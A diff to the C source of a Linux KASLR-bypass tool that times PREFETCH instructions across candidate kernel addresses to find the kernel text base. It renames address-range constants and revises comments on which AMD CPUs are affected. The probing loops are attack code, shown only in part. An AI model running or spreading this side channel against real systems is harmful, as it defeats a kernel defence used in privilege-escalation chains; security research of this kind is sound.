@@ -48,12 +48,13 @@
 //
 // Limitations:
 //   - Requires KPTI to be disabled (no signal through KPTI page tables).
-//   - On some newer AMD microarchitectures the prefetch timing
-//     differential for mapped vs unmapped kernel pages is absent; the
-//     attack silently fails on these CPUs. A dedicated technique for
-//     newer AMD generations (e.g. Zen 3+) may be required.
 //   - Timing resolution depends on rdtscp granularity, which varies
 //     across microarchitectures.
+//   - The signal can be transiently masked by system state (scheduler
+//     placement, CPU power / frequency state, thermal throttling,
+//     concurrent load) and reappear after the state changes. A run
+//     that returns no result is not proof the technique does not
+//     apply to the CPU.
 //
 // Timing measurement inline asm based on the EntryBleed PoC by Will:
 //   https://www.willsroot.io/2022/12/entrybleed.html
@@ -77,8 +78,8 @@
 //   KPTI (CONFIG_PAGE_TABLE_ISOLATION=y) removes kernel mappings from
 //   userspace page tables, eliminating the timing differential. KPTI is
 //   auto-disabled for CPUs not vulnerable to Meltdown (all AMD, Intel Ice
-//   Lake+). Some newer AMD Zen 3+ microarchitectures lack the prefetch
-//   timing differential entirely. No kernel patch; hardware-dependent.
+//   Lake+); on those CPUs the prefetch timing differential is in scope
+//   by default and no kernel patch addresses it directly.
 //
 // References:
 //   https://gruss.cc/files/prefetch.pdf
@@ -105,7 +106,7 @@ KASLD_EXPLAIN(
     "unmapped kernel pages, even from user mode. By timing PREFETCH "
     "across KASLR-aligned candidate addresses, the mapped kernel text "
     "base is identified. Mitigated by KPTI (separate page tables for "
-    "user/kernel mode) and fixed in newer AMD Zen 3+ hardware.");
+    "user/kernel mode).");
 
 KASLD_META("method:timing\n"
            "phase:probing\n"
@@ -130,7 +131,7 @@ static int verbose = 0;
 // ---------------------------------------------------------------------------
 
 #define STEP KERNEL_ALIGN
-#define NUM_SLOTS ((KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP)
+#define NUM_SLOTS ((KERNEL_TEXT_MAX - KERNEL_TEXT_MIN) / STEP)
 #define ITERATIONS 64
 #define WARMUP 3
 
@@ -143,7 +144,7 @@ static void collect_timings(uint64_t *times) {
 
   for (i = 0; i < WARMUP + ITERATIONS; i++) {
     for (idx = 0; idx < NUM_SLOTS; idx++) {
-      uint64_t target = KERNEL_BASE_MIN + idx * STEP;
+      uint64_t target = KERNEL_TEXT_MIN + idx * STEP;
       uint64_t t = time_prefetch(target);
 
       if (i >= WARMUP && t < times[idx])
@@ -172,11 +173,11 @@ static void collect_timings_amd(uint64_t *times) {
 
   for (i = 0; i < WARMUP; i++)
     for (idx = 0; idx < NUM_SLOTS; idx++)
-      time_prefetch(KERNEL_BASE_MIN + idx * STEP);
+      time_prefetch(KERNEL_TEXT_MIN + idx * STEP);
 
   for (i = 0; i < ITERATIONS; i++)
     for (idx = 0; idx < NUM_SLOTS; idx++)
-      times[idx] += time_prefetch(KERNEL_BASE_MIN + idx * STEP);
+      times[idx] += time_prefetch(KERNEL_TEXT_MIN + idx * STEP);
 }
 
 // ---------------------------------------------------------------------------
@@ -187,7 +188,7 @@ static void dump_timings(const uint64_t *times, const char *stat) {
   fprintf(stderr, "# slot addr %s\n", stat);
   for (idx = 0; idx < NUM_SLOTS; idx++) {
     fprintf(stderr, "%3lu 0x%lx %lu\n", idx,
-            (unsigned long)(KERNEL_BASE_MIN + idx * STEP),
+            (unsigned long)(KERNEL_TEXT_MIN + idx * STEP),
             (unsigned long)times[idx]);
   }
 }
@@ -208,7 +209,7 @@ static unsigned long find_base_intel(const uint64_t *times) {
     }
   }
 
-  return KERNEL_BASE_MIN + best * STEP;
+  return KERNEL_TEXT_MIN + best * STEP;
 }
 
 // ---------------------------------------------------------------------------
@@ -268,7 +269,7 @@ static unsigned long find_base_amd(const uint64_t *times) {
         count++;
     }
     if (count >= CONFIRM_K)
-      return KERNEL_BASE_MIN + idx * STEP;
+      return KERNEL_TEXT_MIN + idx * STEP;
   }
 
   return 0;
@@ -366,7 +367,7 @@ static unsigned long get_kernel_addr_prefetch(void) {
     return 0;
   }
 
-  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
+  if (addr >= KERNEL_TEXT_MIN && addr <= KERNEL_TEXT_MAX)
     return addr;
 
   return 0;
